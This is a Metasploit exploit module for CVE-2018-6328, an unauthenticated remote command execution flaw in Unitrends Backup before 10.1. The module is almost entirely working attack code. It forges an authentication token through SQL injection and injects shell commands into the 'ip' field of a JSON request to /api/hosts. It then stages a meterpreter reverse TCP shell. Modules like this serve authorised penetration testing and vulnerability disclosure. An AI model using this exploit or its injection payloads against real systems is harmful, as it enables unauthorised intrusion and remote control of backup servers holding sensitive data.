##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Unitrends UEB 10 http api/storage remote command execution',
      'Description'    => %q{
        It was discovered that the api/storage web interface in Unitrends Backup (UB)
        before 10.1 has an issue in which one of its input parameters was not validated.
        A remote attacker could use this flaw to bypass authentication and execute arbitrary
        commands on the target system.
      },
      'Author'         =>
        [
          'Cale Smith', # @0xC413
          'Benny Husted', # @BennyHusted
          'Jared Arave' # @iotennui
        ],
      'DisclosureDate' => 'Mar 14 2018',
      'License'        => MSF_LICENSE,
      'Platform'       => 'linux',
      'Arch' => [ARCH_X86],
      'CmdStagerFlavor' => [ 'printf' ],
      'References'     =>
        [
          ['URL', 'https://support.unitrends.com/UnitrendsBackup/s/article/000006002'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2018-6328'],
          ['URL', 'http://blog.redactedsec.net/exploits/2018/01/29/UEB9.html'],
          ['EDB', '44297'],
          ['CVE', '2018-6328'],
        ],
      'Targets'        =>
        [
          [ 'UEB <= 10.0', { } ]
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
         'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp',
         'SSL' => true,
         'PrependFork' => true,
         'WfsDelay' => 2
        },
      'DefaultTarget'   => 0))
    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Use SSL', true])
      ])
    deregister_options('SRVHOST', 'SRVPORT')
  end

  def check
    session = "v0:b' UNION SELECT -1 -- :1:/usr/bp/logs.dir/gui_root.log:0"  #SQLi auth bypass
    session = Base64.strict_encode64(session) #b64 encode session token

    res = send_request_cgi!({
        'method' => 'GET',
        'uri'    => '/api/systems/details',
        'ctype'  => 'application/json',
        'headers' =>
        {'AuthToken' => session,}
      })
    if res && res.code == 200
      print_good("Good news, looks like a vulnerable version of UEB.")
      return CheckCode::Appears
    else
      print_bad('Host does not appear to be vulnerable.')
    end
    return CheckCode::Safe

  end

  #substitue some charactes
  def filter_bad_chars(cmd)
    cmd.gsub!("\\", "\\\\\\")
    cmd.gsub!("'", '\\"')
  end

  def execute_command(cmd, opts = {})

    session = "v0:b' UNION SELECT -1 -- :1:/usr/bp/logs.dir/gui_root.log:0"  #SQLi auth bypass
    session = Base64.strict_encode64(session) #b64 encode session token

    #substitue the cmd into the hostname parameter
    parms = "{\"name\":\"ffff\",\"ip\":\"10.0.0.200'\\\"`0&#{filter_bad_chars(cmd)}`'\"}"
    # print_status(parms);
    res = send_request_cgi({
      'uri' => '/api/hosts',
      'method' => 'POST',
      'ctype'  => 'application/json',
      'encode_params' => false,
      'data'   => parms,
      'headers' =>
      {'AuthToken' => session,}
    })

    if res && res.code != 500
      print_error("Unexpected response")
    end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
  end

  def exploit
    print_status("#{peer} - pwn'ng ueb 10....")
    execute_cmdstager(:linemax => 120)

  end
end
